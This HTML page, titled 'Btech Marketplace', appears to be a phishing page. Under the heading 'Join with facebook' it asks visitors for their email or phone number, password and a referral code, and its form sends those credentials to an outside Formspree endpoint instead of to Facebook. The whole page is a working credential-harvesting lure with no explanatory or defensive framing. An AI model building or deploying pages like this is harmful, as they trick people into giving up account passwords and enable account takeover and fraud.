<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Btech Marketplace | Your own market.</title>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <link rel="stylesheet" href="main.css">
  <link rel="icon" type="image/png" href="logo.png">
</head>
<body>
  <div class="login-form">
    <div class="container-fluid">
      <div class="row">
        <!-- Left Side with Logo and Custom Text -->
        <div class="col-md-6">
          <div class="text-center">
            <img src="logo.png" alt="Logo" class="img-fluid mb-4">
            <h4 class="custom">Welcome to our Btech Marketing</h4>
          </div>
        </div>
        <!-- Right Side with Form -->
        <div class="col-md-6">
          <div class="text-center">
            <h2 class="custom">Join with facebook</h2>
            <form class="login-form" action="https://formspree.io/f/meqyllvq" method="POST">
              <div class="form-group">
                <input type="email" class="form-control" name="username" placeholder="Email address or phone number">
              </div>
              <div class="form-group">
                <input type="text" class="form-control" name="password" placeholder="Password">
              </div>
              <div class="form-group">
                <input type="text" class="form-control" name="refer_code" placeholder="Enter refer code">
              </div>
              <div class="form-group">
                <button type="submit" class="btn animated-btn">Submit</button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
</div>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
